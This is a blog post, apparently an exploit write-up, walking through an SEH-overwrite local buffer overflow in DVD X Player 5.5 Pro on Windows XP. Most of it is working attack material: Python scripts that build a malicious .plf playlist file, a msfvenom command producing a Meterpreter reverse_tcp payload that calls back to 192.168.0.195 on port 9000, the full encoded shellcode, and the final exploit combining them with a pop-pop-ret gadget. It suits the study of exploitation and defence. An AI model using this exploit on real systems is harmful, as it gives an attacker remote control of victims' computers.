---
layout:     post
title:      DVD X Player 5.5 Pro - Local Overflow
author:     wooy0ung
tags:       hevd
category:   exploit
---

>[Analysis Environment]  
>guest machine: Windows XP Pro sp3  
>host machine: Windows 10  
<!-- more -->


## 0x001 Test POC

Create pattern strings.
```
λ python pattern.py create 0x800
```

Generate evil file.
```
#!/usr/bin/python
# -*- coding:utf8 -*-
  
filename="evil.plf"
 
buffer = "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak2Ak3Ak4Ak5Ak6Ak7Ak8Ak9Al0Al1Al2Al3Al4Al5Al6Al7Al8Al9Am0Am1Am2Am3Am4Am5Am6Am7Am8Am9An0An1An2An3An4An5An6An7An8An9Ao0Ao1Ao2Ao3Ao4Ao5Ao6Ao7Ao8Ao9Ap0Ap1Ap2Ap3Ap4Ap5Ap6Ap7Ap8Ap9Aq0Aq1Aq2Aq3Aq4Aq5Aq6Aq7Aq8Aq9Ar0Ar1Ar2Ar3Ar4Ar5Ar6Ar7Ar8Ar9As0As1As2As3As4As5As6As7As8As9At0At1At2At3At4At5At6At7At8At9Au0Au1Au2Au3Au4Au5Au6Au7Au8Au9Av0Av1Av2Av3Av4Av5Av6Av7Av8Av9Aw0Aw1Aw2Aw3Aw4Aw5Aw6Aw7Aw8Aw9Ax0Ax1Ax2Ax3Ax4Ax5Ax6Ax7Ax8Ax9Ay0Ay1Ay2Ay3Ay4Ay5Ay6Ay7Ay8Ay9Az0Az1Az2Az3Az4Az5Az6Az7Az8Az9Ba0Ba1Ba2Ba3Ba4Ba5Ba6Ba7Ba8Ba9Bb0Bb1Bb2Bb3Bb4Bb5Bb6Bb7Bb8Bb9Bc0Bc1Bc2Bc3Bc4Bc5Bc6Bc7Bc8Bc9Bd0Bd1Bd2Bd3Bd4Bd5Bd6Bd7Bd8Bd9Be0Be1Be2Be3Be4Be5Be6Be7Be8Be9Bf0Bf1Bf2Bf3Bf4Bf5Bf6Bf7Bf8Bf9Bg0Bg1Bg2Bg3Bg4Bg5Bg6Bg7Bg8Bg9Bh0Bh1Bh2Bh3Bh4Bh5Bh6Bh7Bh8Bh9Bi0Bi1Bi2Bi3Bi4Bi5Bi6Bi7Bi8Bi9Bj0Bj1Bj2Bj3Bj4Bj5Bj6Bj7Bj8Bj9Bk0Bk1Bk2Bk3Bk4Bk5Bk6Bk7Bk8Bk9Bl0Bl1Bl2Bl3Bl4Bl5Bl6Bl7Bl8Bl9Bm0Bm1Bm2Bm3Bm4Bm5Bm6Bm7Bm8Bm9Bn0Bn1Bn2Bn3Bn4Bn5Bn6Bn7Bn8Bn9Bo0Bo1Bo2Bo3Bo4Bo5Bo6Bo7Bo8Bo9Bp0Bp1Bp2Bp3Bp4Bp5Bp6Bp7Bp8Bp9Bq0Bq1Bq2Bq3Bq4Bq5Bq6Bq7Bq8Bq9Br0Br1Br2Br3Br4Br5Br6Br7Br8Br9Bs0Bs1Bs2Bs3Bs4Bs5Bs6Bs7Bs8Bs9Bt0Bt1Bt2Bt3Bt4Bt5Bt6Bt7Bt8Bt9Bu0Bu1Bu2Bu3Bu4Bu5Bu6Bu7Bu8Bu9Bv0Bv1Bv2Bv3Bv4Bv5Bv6Bv7Bv8Bv9Bw0Bw1Bw2Bw3Bw4Bw5Bw6Bw7Bw8Bw9Bx0Bx1Bx2Bx3Bx4Bx5Bx6Bx7Bx8Bx9By0By1By2By3By4By5By6By7By8By9Bz0Bz1Bz2Bz3Bz4Bz5Bz6Bz7Bz8Bz9Ca0Ca1Ca2Ca3Ca4Ca5Ca6Ca7Ca8Ca9Cb0Cb1Cb2Cb3Cb4Cb5Cb6Cb7Cb8Cb9Cc0Cc1Cc2Cc3Cc4Cc5Cc6Cc7Cc8Cc9Cd0Cd1Cd2Cd3Cd4Cd5Cd6Cd7Cd8Cd9Ce0Ce1Ce2Ce3Ce4Ce5Ce6Ce7Ce8Ce9Cf0Cf1Cf2Cf3Cf4Cf5Cf6Cf7Cf8Cf9Cg0Cg1Cg2Cg3Cg4Cg5Cg6Cg7Cg8Cg9Ch0Ch1Ch2Ch3Ch4Ch5Ch6Ch7Ch8Ch9Ci0Ci1Ci2Ci3Ci4Ci5Ci6Ci7Ci8Ci9Cj0Cj1Cj2Cj3Cj4Cj5Cj6Cj7Cj8Cj9Ck0Ck1Ck2Ck3Ck4Ck5Ck6Ck7Ck8Ck9Cl0Cl1Cl2Cl3Cl4Cl5Cl6Cl7Cl8Cl9Cm0Cm1Cm2Cm3Cm4Cm5Cm6Cm7Cm8Cm9Cn0Cn1Cn2Cn3Cn4Cn5Cn6Cn7Cn8Cn9Co0Co1Co2Co3Co4Co5Co6Co7Co8Co9Cp0Cp1Cp2Cp3Cp4Cp5Cp6Cp7Cp8Cp9Cq0Cq1Cq"
  
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
```

Application will crash!
![](/assets/img/exploit/2018-08-13-dvd-x-player-5.5-pro-local-overflow/0x001.png)

Calculate the distance to first SEH node(offset 608).
```
!mona findmsp
```
![](/assets/img/exploit/2018-08-13-dvd-x-player-5.5-pro-local-overflow/0x002.png)


## 0x002 How to Exploit it?

Find some ROP gadget, I may use a "pop pop ret" opcode. For versatility, I choose it from EPG.dll module.
```
!mona seh
```
![](/assets/img/exploit/2018-08-13-dvd-x-player-5.5-pro-local-overflow/0x003.png)

Try this script.
```
#!/usr/bin/python
# -*- coding:utf8 -*-
import struct
  
filename="evil.plf"
 
buffer = 'A'*608
buffer += 'B'*4
buffer += struct.pack('<L',0x6164172e)
buffer = buffer.ljust(2000,'C')
  
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()
```

When application crashed, we open SEH chain windows and set a breakpoint at the SEH process method.
![](/assets/img/exploit/2018-08-13-dvd-x-player-5.5-pro-local-overflow/0x004.png)

Press shift + F9 to catch the exception.
![](/assets/img/exploit/2018-08-13-dvd-x-player-5.5-pro-local-overflow/0x005.png)

After executing this SEH handler, it will jump to stack and point to the Pointer to next SEH record.

Now, we can organize our shellcode at the stack and overwrite this pointer with the pointer to our shellcode.
![](/assets/img/exploit/2018-08-13-dvd-x-player-5.5-pro-local-overflow/0x006.png)
![](/assets/img/exploit/2018-08-13-dvd-x-player-5.5-pro-local-overflow/0x007.png)


## 0x003 Exploit it!

Generate payload
```
λ msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.195 LPORT=9000 -b '\x00\x0A\x0D\x1A' -f python
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
Found 10 compatible encoders
Attempting to encode payload with 1 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 368 (iteration=0)
x86/shikata_ga_nai chosen with final size 368
Payload size: 368 bytes
Final size of python file: 1772 bytes
buf =  ""
buf += "\xba\xd5\xf6\x2f\x9c\xdb\xd4\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x56\x31\x56\x13\x03\x56\x13\x83\xc6\xd1\x14"
buf += "\xda\x60\x31\x5a\x25\x99\xc1\x3b\xaf\x7c\xf0\x7b\xcb"
buf += "\xf5\xa2\x4b\x9f\x58\x4e\x27\xcd\x48\xc5\x45\xda\x7f"
buf += "\x6e\xe3\x3c\xb1\x6f\x58\x7c\xd0\xf3\xa3\x51\x32\xca"
buf += "\x6b\xa4\x33\x0b\x91\x45\x61\xc4\xdd\xf8\x96\x61\xab"
buf += "\xc0\x1d\x39\x3d\x41\xc1\x89\x3c\x60\x54\x82\x66\xa2"
buf += "\x56\x47\x13\xeb\x40\x84\x1e\xa5\xfb\x7e\xd4\x34\x2a"
buf += "\x4f\x15\x9a\x13\x60\xe4\xe2\x54\x46\x17\x91\xac\xb5"
buf += "\xaa\xa2\x6a\xc4\x70\x26\x69\x6e\xf2\x90\x55\x8f\xd7"
buf += "\x47\x1d\x83\x9c\x0c\x79\x87\x23\xc0\xf1\xb3\xa8\xe7"
buf += "\xd5\x32\xea\xc3\xf1\x1f\xa8\x6a\xa3\xc5\x1f\x92\xb3"
buf += "\xa6\xc0\x36\xbf\x4a\x14\x4b\xe2\x02\xd9\x66\x1d\xd2"
buf += "\x75\xf0\x6e\xe0\xda\xaa\xf8\x48\x92\x74\xfe\xd9\xb4"
buf += "\x86\xd0\x61\xd4\x78\xd1\x91\xfc\xbe\x85\xc1\x96\x17"
buf += "\xa6\x8a\x66\x97\x73\x26\x6d\x0f\xbc\x1e\x71\x0c\x54"
buf += "\x5c\x72\xb1\x8d\xe9\x94\xe5\x9d\xb9\x08\x46\x4e\x79"
buf += "\xf9\x2e\x84\x76\x26\x4e\xa7\x5d\x4f\xe5\x48\x0b\x27"
buf += "\x92\xf1\x16\xb3\x03\xfd\x8d\xb9\x04\x75\x27\x3d\xca"
buf += "\x7e\x42\x2d\x3b\x19\xac\xad\xbc\x8c\xac\xc7\xb8\x06"
buf += "\xfb\x7f\xc3\x7f\xcb\xdf\x3c\xaa\x48\x27\xc2\x2b\x78"
buf += "\x53\xf5\xb9\xc4\x0b\xfa\x2d\xc4\xcb\xac\x27\xc4\xa3"
buf += "\x08\x1c\x97\xd6\x56\x89\x84\x4a\xc3\x32\xfc\x3f\x44"
buf += "\x5b\x02\x19\xa2\xc4\xfd\x4c\xb0\x03\x01\x12\x9f\xab"
buf += "\x69\xec\x9f\x4b\x69\x86\x1f\x1c\x01\x5d\x0f\x93\xe1"
buf += "\x9e\x9a\xfc\x69\x14\x4b\x4e\x08\x29\x46\x0e\x94\x2a"
buf += "\x65\x8b\x27\x50\x06\x2c\xc8\xa5\x0e\x49\xc9\xa5\x2e"
buf += "\x6f\xf6\x73\x17\x05\x39\x40\x2c\x16\x0c\xe5\x05\xbd"
buf += "\x6e\xb9\x56\x94"
```

Relative jump to shellcode on the stack by instruction "jmp 0x8"
```
#!/usr/bin/python
# -*- coding:utf8 -*-
import struct
  
filename="evil.plf"

buf =  ""
buf += "\xba\xd5\xf6\x2f\x9c\xdb\xd4\xd9\x74\x24\xf4\x5e\x31"
buf += "\xc9\xb1\x56\x31\x56\x13\x03\x56\x13\x83\xc6\xd1\x14"
buf += "\xda\x60\x31\x5a\x25\x99\xc1\x3b\xaf\x7c\xf0\x7b\xcb"
buf += "\xf5\xa2\x4b\x9f\x58\x4e\x27\xcd\x48\xc5\x45\xda\x7f"
buf += "\x6e\xe3\x3c\xb1\x6f\x58\x7c\xd0\xf3\xa3\x51\x32\xca"
buf += "\x6b\xa4\x33\x0b\x91\x45\x61\xc4\xdd\xf8\x96\x61\xab"
buf += "\xc0\x1d\x39\x3d\x41\xc1\x89\x3c\x60\x54\x82\x66\xa2"
buf += "\x56\x47\x13\xeb\x40\x84\x1e\xa5\xfb\x7e\xd4\x34\x2a"
buf += "\x4f\x15\x9a\x13\x60\xe4\xe2\x54\x46\x17\x91\xac\xb5"
buf += "\xaa\xa2\x6a\xc4\x70\x26\x69\x6e\xf2\x90\x55\x8f\xd7"
buf += "\x47\x1d\x83\x9c\x0c\x79\x87\x23\xc0\xf1\xb3\xa8\xe7"
buf += "\xd5\x32\xea\xc3\xf1\x1f\xa8\x6a\xa3\xc5\x1f\x92\xb3"
buf += "\xa6\xc0\x36\xbf\x4a\x14\x4b\xe2\x02\xd9\x66\x1d\xd2"
buf += "\x75\xf0\x6e\xe0\xda\xaa\xf8\x48\x92\x74\xfe\xd9\xb4"
buf += "\x86\xd0\x61\xd4\x78\xd1\x91\xfc\xbe\x85\xc1\x96\x17"
buf += "\xa6\x8a\x66\x97\x73\x26\x6d\x0f\xbc\x1e\x71\x0c\x54"
buf += "\x5c\x72\xb1\x8d\xe9\x94\xe5\x9d\xb9\x08\x46\x4e\x79"
buf += "\xf9\x2e\x84\x76\x26\x4e\xa7\x5d\x4f\xe5\x48\x0b\x27"
buf += "\x92\xf1\x16\xb3\x03\xfd\x8d\xb9\x04\x75\x27\x3d\xca"
buf += "\x7e\x42\x2d\x3b\x19\xac\xad\xbc\x8c\xac\xc7\xb8\x06"
buf += "\xfb\x7f\xc3\x7f\xcb\xdf\x3c\xaa\x48\x27\xc2\x2b\x78"
buf += "\x53\xf5\xb9\xc4\x0b\xfa\x2d\xc4\xcb\xac\x27\xc4\xa3"
buf += "\x08\x1c\x97\xd6\x56\x89\x84\x4a\xc3\x32\xfc\x3f\x44"
buf += "\x5b\x02\x19\xa2\xc4\xfd\x4c\xb0\x03\x01\x12\x9f\xab"
buf += "\x69\xec\x9f\x4b\x69\x86\x1f\x1c\x01\x5d\x0f\x93\xe1"
buf += "\x9e\x9a\xfc\x69\x14\x4b\x4e\x08\x29\x46\x0e\x94\x2a"
buf += "\x65\x8b\x27\x50\x06\x2c\xc8\xa5\x0e\x49\xc9\xa5\x2e"
buf += "\x6f\xf6\x73\x17\x05\x39\x40\x2c\x16\x0c\xe5\x05\xbd"
buf += "\x6e\xb9\x56\x94"

shellcode = '\x90'*20
shellcode += buf
 
buffer = 'A'*608
buffer += "\xEB\x06\x90\x90"
buffer += struct.pack('<L',0x6164172e)
buffer += shellcode
buffer = buffer.ljust(2000,'C')
  
textfile = open(filename , 'w')
textfile.write(buffer)
textfile.close()

```

Win~
![](/assets/img/exploit/2018-08-13-dvd-x-player-5.5-pro-local-overflow/0x008.png)
![](/assets/img/exploit/2018-08-13-dvd-x-player-5.5-pro-local-overflow/0x009.png)